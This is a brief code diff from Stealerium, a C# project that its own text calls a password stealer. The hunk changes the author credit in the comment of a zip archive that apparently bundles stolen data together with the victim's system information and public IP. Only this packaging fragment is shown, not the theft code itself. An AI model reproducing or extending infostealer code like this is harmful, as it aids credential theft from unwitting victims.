@@ -60,7 +60,7 @@ namespace Stealerium.Helpers
                 {
                     zip.CompressionLevel = CompressionLevel.BestCompression;
                     zip.Comment = "" +
-                                  $"\nStealerium v{Config.Version} - Passwords stealer coded by Stealerium with Love <3" +
+                                  $"\nStealerium {Config.Version} - coded by @kgnfth with Love <3" +
                                   "\n" +
                                   "\n== System Info ==" +
                                   "\nIP: " + SystemInfo.GetPublicIpAsync() +
